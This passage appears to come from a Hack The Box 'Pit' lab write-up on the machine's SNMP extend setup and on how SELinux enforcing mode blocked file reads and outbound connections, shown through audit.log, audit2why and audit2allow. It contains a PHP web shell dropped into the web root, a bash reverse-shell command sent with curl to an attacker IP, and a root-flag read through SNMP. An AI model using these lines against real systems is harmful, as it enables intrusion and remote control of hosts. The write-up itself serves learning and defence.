</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.4.1.2021.2</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.4.1.2021.8</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.2.1.25.4.2</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.4.1.2021.9</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>view    systemview    included   .1.3.6.1.4.1.8072.1.3.2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>####</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Finally, grant the group read-only access to the systemview view.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#       group          context sec.model sec.level prefix read   write  notif</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>access  notConfigGroup &#34;&#34;      any       noauth    exact  systemview none none</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>###############################################################################</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># disk checks</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># The agent can check the amount of available disk space, and make</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># sure it is above a set limit.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># disk PATH [MIN=100000]</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># PATH:  mount path to the disk in question.</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># MIN:   Disks with space below this value will have the Mib&#39;s errorFlag set.</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#        Default value = 100000.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Check the / partition and make sure it contains at least 10 megs.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>disk / 10000</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>disk /var/www/html/seeddms51x/seeddms</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>###############################################################################</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Extensible sections.</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># This alleviates the multiple line output problem found in the</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># previous executable mib by placing each mib in its own mib table:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Run a shell script containing:</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># #!/bin/sh</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># echo hello world</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># echo hi there</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># exit 35</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># Note:  this has been specifically commented out to prevent</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># accidental security holes due to someone else on your system writing</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># a /tmp/shtest before you do.  Uncomment to use it.</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#exec .1.3.6.1.4.1.2021.50 shelltest /bin/sh /tmp/shtest</span>
</span></span><span style=display:flex><span><span style=color:#50fa7b>extend monitoring /usr/bin/monitor</span>
</span></span></code></pre></td></tr></table></div></div><p>The public community-string has no write permissions and is therefore not exploitable.</p><pre><code>snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.10.10.241 \
&gt; 'nsExtendStatus.&quot;evilcommand&quot;' = createAndGo \
&gt; 'nsExtendCommand.&quot;evilcommand&quot;' = /bin/echo \
&gt; 'nsExtendArgs.&quot;evilcommand&quot;' = 'hello world'
</code></pre><p>output:</p><pre><code>Error in packet.
Reason: noAccess
Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus.&quot;evilcommand&quot;
</code></pre><h2 id=beyond-root---selinux>Beyond root - SELinux</h2><p>SeLinux can run in two modes - Enforce (1) and Permissive (0). getenforce will return which mode is running.</p><pre><code>[root@pit ~]# getenforce
Enforcing
</code></pre><p>Enforcing will block specific activities, where as Permissive will just log them in <code>/var/log/audit/audit.log</code> but let them happen.</p><p>As root, it is possible to change SeLinux mode:</p><pre><code>setenforce permissive
[root@pit ~]# getenforce
Permissive
[root@pit ~]# setenforce enforcing
[root@pit ~]# getenforce
Enforcing
</code></pre><p>SeLinux add extended attributes to the file system, we can identify them because of the <code>.</code> at the end of the permissions <code>-rwxr-xr-x.</code>. We use <code>ls -Z</code> to view it:</p><pre><code>[root@pit ~]# ls -lZ /usr/sbin/nginx
-rwxr-xr-x. 1 root root system_u:object_r:httpd_exec_t:s0 1264168 Oct  7  2019 /usr/sbin/nginx
[root@pit ~]# ls -lZ /root/root.txt
-r--------. 1 root root unconfined_u:object_r:admin_home_t:s0 33 Oct  1 01:12 /root/root.tx
</code></pre><p>SeLinux also add ACLs to files, which we can identify with the <code>+</code> at the end of the permissions <code>drwxrwx---+</code>. We can use both <code>ls -Z</code> and <code>getfacl</code> to read extended attributes and extended ACLs:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>[</span>root@pit ~<span style=color:#ff79c6>]</span><span style=color:#6272a4># ls -Zl /usr/local/ | grep monitoring</span>
</span></span><span style=display:flex><span>drwxrwx---+ <span style=color:#bd93f9>2</span> root root system_u:object_r:usr_t:s0 <span style=color:#bd93f9>122</span> Oct  <span style=color:#bd93f9>3</span> 13:50 monitoring
</span></span><span style=display:flex><span><span style=color:#ff79c6>[</span>root@pit ~<span style=color:#ff79c6>]</span><span style=color:#6272a4># getfacl /usr/local/monitoring/</span>
</span></span><span style=display:flex><span>getfacl: Removing leading <span style=color:#f1fa8c>&#39;/&#39;</span> from absolute path names
</span></span><span style=display:flex><span><span style=color:#6272a4># file: usr/local/monitoring/</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># owner: root</span>
</span></span><span style=display:flex><span><span style=color:#6272a4># group: root</span>
</span></span><span style=display:flex><span>user::rwx
</span></span><span style=display:flex><span>user:michelle:-wx
</span></span><span style=display:flex><span>group::rwx
</span></span><span style=display:flex><span>mask::rwx
</span></span><span style=display:flex><span>other::---
</span></span></code></pre></td></tr></table></div></div><p>We can verify which extended attributes for processes with <code>ps -Z</code>.</p><pre><code>[root@pit ~]# ps -auxZ | egrep &quot;nginx|snmp&quot;
system_u:system_r:httpd_t:s0    root        1168  0.0  0.0 119280  2308 ?        Ss   Oct01   0:00 nginx: master process /usr/sbin/nginx
system_u:system_r:httpd_t:s0    nginx       1174  0.0  0.2 151984  8096 ?        S    Oct01   0:01 nginx: worker process
system_u:system_r:httpd_t:s0    nginx       1176  0.0  0.2 151984  9732 ?        S    Oct01   0:29 nginx: worker process
system_u:system_r:snmpd_t:s0    root        1445  0.0  0.3 101592 13996 ?        Ss   Oct01   1:17 /usr/sbin/snmpd -LS0-6d -f
system_u:system_r:httpd_t:s0    nginx      42856  0.0  0.3 266780 13084 ?        S    13:35   0:00 php-fpm: pool www
</code></pre><h3 id=snmp-is-blocked-from-reading-the-file>SNMP is blocked from reading the file</h3><p>When we look at the root.txt file, we can see it has a <code>.</code> in his permissions <code>-r--------.</code> which means there is extended attributes we can list with <code>ls -Z</code></p><pre><code>ls -Zl /root/root.txt
-r--------. 1 root root unconfined_u:object_r:admin_home_t:s0 33 Oct  1 01:12 /root/root.txt
</code></pre><p>a consequence is SNMP, while running as root, is not capable to read the root.txt flag.</p><pre><code>echo &quot;echo &quot;root flag:&quot;; cat /root/root.txt&quot; \
&gt; /usr/local/monitoring/check_root_flag.sh
</code></pre><p>indeed, we obtain a permission denied</p><pre><code>snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendObjects
snmpwalk -Os -v1 -c public 10.10.10.241 nsExtendOutLine
[..]
nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: root flag:
nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: cat: /root/root.txt: Permission denied
</code></pre><p>Attempt to Set SeLinux to permissive via SNMP mode will fail:</p><pre><code>echo &quot;setenforce permissive; echo &quot;root flag:&quot;; \
cat /root/root.txt&quot; &gt; check_root_flag.sh
</code></pre><p>output:</p><pre><code>nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: setenforce:  setenforce() failed
</code></pre><p>However from root account:</p><pre><code>setenforce permissive
[root@pit ~]# getenforce
Permissive
</code></pre><p>We can now receive the flag from SNMP:</p><pre><code>nsExtendOutLine.&quot;monitoring&quot;.9 = STRING: root flag:
nsExtendOutLine.&quot;monitoring&quot;.10 = STRING: 7fb116865e6477410fca1d8cc4426733
</code></pre><p>Let&rsquo;s see why we were blocked in <code>enforcing</code> mode from reading the audit.log. We have one READ syscall unsuccessfully executed (success=no):</p><pre><code>cat /var/log/audit/audit.log | grep snmp
[..]
type=AVC msg=audit(1633276582.379:13045): avc:  denied  { read } for  pid=39044 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=0
type=SYSCALL msg=audit(1633276582.379:13045): arch=c000003e syscall=257 success=no exit=-13 a0=ffffff9c a1=7ffcdc63df21 a2=0 a3=0 items=0 ppid=39042 pid=39044 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=openat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
</code></pre><p>Let&rsquo;s do the same in <code>permissive mode</code>, we have more logs, because while it says denied, being in permissive=1 mode, it executes anyway the syscalls (<code>success=yes</code>)</p><pre><code>cat /var/log/audit/audit.log | grep snmp
[..]
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { read } for  pid=39521 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { open } for  pid=39521 comm=&quot;cat&quot; path=&quot;/root/root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=SYSCALL msg=audit(1633277219.499:13069): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7fff26c3bf21 a2=0 a3=0 items=0 ppid=39520 pid=39521 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=openat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
type=AVC msg=audit(1633277219.499:13070): avc:  denied  { getattr } for  pid=39521 comm=&quot;cat&quot; path=&quot;/root/root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1
type=SYSCALL msg=audit(1633277219.499:13070): arch=c000003e syscall=5 success=yes exit=0 a0=3 a1=7fff26c3a6c0 a2=7fff26c3a6c0 a3=0 items=0 ppid=39520 pid=39521 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=&quot;cat&quot; exe=&quot;/usr/bin/cat&quot; subj=system_u:system_r:snmpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=fstat AUID=&quot;unset&quot; UID=&quot;root&quot; GID=&quot;root&quot; EUID=&quot;root&quot; SUID=&quot;root&quot; FSUID=&quot;root&quot; EGID=&quot;root&quot; SGID=&quot;root&quot; FSGID=&quot;root&quot;
</code></pre><p>The logs show that <code>snmpd_t</code> role is trying to access the target role <code>admin_home_t</code>. We can audit why we are not allowed with <code>audit2why</code>:</p><pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep snmp | grep read | grep root.txt | tail -1 | audit2why
type=AVC msg=audit(1633277219.499:13069): avc:  denied  { read } for  pid=39521 comm=&quot;cat&quot; name=&quot;root.txt&quot; dev=&quot;dm-0&quot; ino=2435300 scontext=system_u:system_r:snmpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file permissive=1

    Was caused by:
            Missing type enforcement (TE) allow rule.

            You can use audit2allow to generate a loadable module to allow this access.
</code></pre><p>We can check the SeLinux configuration needed to make it possible with the <code>audit2allow</code> command-line. The below allows <code>snmpd_t</code> to read files that belongs to <code>admin_home_t</code>:</p><pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep snmp | grep read | grep root.txt | tail -1 | audit2allow
[..]
#============= snmpd_t ==============
allow snmpd_t admin_home_t:file read;
</code></pre><h3 id=why-we-were-not-able-to-obtain-a-reverse-shell>Why we were not able to obtain a reverse shell</h3><p>In permissive mode, I am able to obtain a reverse shell:</p><pre><code>[root@pit ~]# setenforce permissive
[root@pit ~]# getenforce
Permissive
[root@pit ~]# echo '&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;' &gt; /var/www/html/sh.php
</code></pre><p>Let&rsquo;s try to get a reverse shell:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>URL</span><span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#34;http://dms-pit.htb/sh.php&#34;</span>
</span></span><span style=display:flex><span>curl -vvv -G <span style=color:#8be9fd;font-style:italic>$URL</span> --data-urlencode <span style=color:#f1fa8c>&#34;cmd=bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/443 0&gt;&amp;1&#39;&#34;</span>
</span></span><span style=display:flex><span>*   Trying 10.10.10.241:80...
</span></span><span style=display:flex><span>* TCP_NODELAY <span style=color:#8be9fd;font-style:italic>set</span>
</span></span><span style=display:flex><span>* Connected to dms-pit.htb <span style=color:#ff79c6>(</span>10.10.10.241<span style=color:#ff79c6>)</span> port <span style=color:#bd93f9>80</span> <span style=color:#ff79c6>(</span><span style=color:#6272a4>#0)</span>
</span></span><span style=display:flex><span>&gt; GET /sh.php?cmd<span style=color:#ff79c6>=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.53%2F443%200%3E%261%27 HTTP/1.1
</span></span><span style=display:flex><span>&gt; Host: dms-pit.htb
</span></span><span style=display:flex><span>&gt; User-Agent: curl/7.68.0
</span></span><span style=display:flex><span>&gt; Accept: */*
</span></span><span style=display:flex><span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style=display:flex><span> sudo nc -lncp <span style=color:#bd93f9>443</span>
</span></span><span style=display:flex><span>Listening on 0.0.0.0 <span style=color:#bd93f9>443</span>
</span></span><span style=display:flex><span>Connection received on 172.19.0.1 <span style=color:#bd93f9>59518</span>
</span></span><span style=display:flex><span>bash: cannot <span style=color:#8be9fd;font-style:italic>set</span> terminal process group <span style=color:#ff79c6>(</span>41351<span style=color:#ff79c6>)</span>: Inappropriate ioctl <span style=color:#ff79c6>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>bash-4.4$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>uid</span><span style=color:#ff79c6>=</span>992<span style=color:#ff79c6>(</span>nginx<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>gid</span><span style=color:#ff79c6>=</span>988<span style=color:#ff79c6>(</span>nginx<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>groups</span><span style=color:#ff79c6>=</span>988<span style=color:#ff79c6>(</span>nginx<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>context</span><span style=color:#ff79c6>=</span>system_u:system_r:httpd_t:s0
</span></span><span style=display:flex><span>bash-4.4$
</span></span></code></pre></td></tr></table></div></div><p>It works and we can audit the log. While the access is denied, in permissive=1 mode, the <code>connect</code> syscall is successful. We can see that <code>httpd_t</code> role is trying to target <code>http_port_t</code> role.</p><pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | tail -2
[..]
type=AVC msg=audit(1633280239.705:13241): avc: denied { name_connect } for pid=41450 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=1
type=SYSCALL msg=audit(1633280239.705:13241): arch=c000003e syscall=42 success=yes exit=0 a0=4 a1=559050fe8ad0 a2=10 a3=0 items=0 ppid=41449 pid=41450 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm=&quot;bash&quot; exe=&quot;/usr/bin/bash&quot; subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AUID=&quot;unset&quot; UID=&quot;nginx&quot; GID=&quot;nginx&quot; EUID=&quot;nginx&quot; SUID=&quot;nginx&quot; FSUID=&quot;nginx&quot; EGID=&quot;nginx&quot; SGID=&quot;nginx&quot; FSGID=&quot;nginx&quot;
</code></pre><p>Repeating the same but in <code>permissive=0</code> mode, we can&rsquo;t get a reverse shell and instead we have this audit log:</p><pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | tail -2
[..]
type=AVC msg=audit(1633281729.867:13299): avc:  denied  { name_connect } for  pid=42387 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0
type=SYSCALL msg=audit(1633281729.867:13299): arch=c000003e syscall=42 success=no exit=-13 a0=4 a1=558212a0dad0 a2=10 a3=0 items=0 ppid=42386 pid=42387 auid=4294967295 uid=992 gid=988 euid=992 suid=992 fsuid=992 egid=988 sgid=988 fsgid=988 tty=(none) ses=4294967295 comm=&quot;bash&quot; exe=&quot;/usr/bin/bash&quot; subj=system_u:system_r:httpd_t:s0 key=(null)ARCH=x86_64 SYSCALL=connect AUID=&quot;unset&quot; UID=&quot;nginx&quot; GID=&quot;nginx&quot; EUID=&quot;nginx&quot; SUID=&quot;nginx&quot; FSUID=&quot;nginx&quot; EGID=&quot;nginx&quot; SGID=&quot;nginx&quot; FSGID=&quot;nginx&quot;
</code></pre><p>We can audit why:</p><pre><code>[root@pit ~]# cat /var/log/audit/audit.log | grep httpd_t | grep name_connect | tail -1 | audit2why
type=AVC msg=audit(1633281729.867:13299): avc:  denied  { name_connect } for  pid=42387 comm=&quot;bash&quot; dest=443 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:http_port_t:s0 tclass=tcp_socket permissive=0

    Was caused by:
    One of the following booleans was set incorrectly.
    Description:
    Allow httpd to can network connect

    Allow access by executing:
    # setsebool -P httpd_can_network_connect 1
    Description:
    Allow httpd to graceful shutdown

    Allow access by executing:
    # setsebool -P httpd_graceful_shutdown 1
    Description:
    Allow httpd to can network relay

    Allow access by executing:
    # setsebool -P httpd_can_network_relay 1
    Description:
    Allow nis to enabled

    Allow access by executing:
    # setsebool -P nis_enabled 1
</code></pre><p>The settings that authorizes creation of network connection is:</p><pre tabindex=0><code>cat /var/log/audit/audit.log | grep httpd_t | grep name_connect | tail -1 | audit2allow

#============= httpd_t ==============

#!!!! This avc can be allowed using one of the these booleans:
#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled
allow httpd_t http_port_t:tcp_socket name_connect;
</code></pre><h3 id=detecting-a-compromised-selinux-box-with-audit2allow>Detecting a compromised SeLinux box with audit2allow</h3><p><code>audit2allow</code> can tell all the rules that (would) have been blocked in enforcing mode:</p><div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#ff79c6>[</span>root@pit ~<span style=color:#ff79c6>]</span><span style=color:#6272a4># audit2allow -i /var/log/audit/audit.log</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#============= httpd_t ==============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#!!!! This avc can be allowed using one of the these booleans:</span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#     httpd_can_network_connect, httpd_graceful_shutdown, httpd_can_network_relay, nis_enabled</span>
</span></span><span style=display:flex><span>allow httpd_t http_port_t:tcp_socket name_connect;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#!!!! This avc can be allowed using the boolean &#39;httpd_can_network_connect&#39;</span>
</span></span><span style=display:flex><span>allow httpd_t ricci_port_t:tcp_socket name_connect;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#6272a4>#!!!! This avc can be allowed using the boolean &#39;httpd_can_network_connect&#39;</span>
